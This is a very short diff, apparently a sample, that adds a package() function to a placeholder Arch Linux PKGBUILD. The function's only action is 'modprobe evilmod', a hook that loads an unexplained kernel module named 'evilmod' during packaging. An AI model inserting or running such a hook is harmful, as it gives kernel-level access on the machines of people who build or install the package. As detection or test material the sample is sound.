@@ -1,0 +1,8 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,2 +1,5 @@
+ pkgname=x
+ pkgver=1
++package() {
++  modprobe evilmod
++}
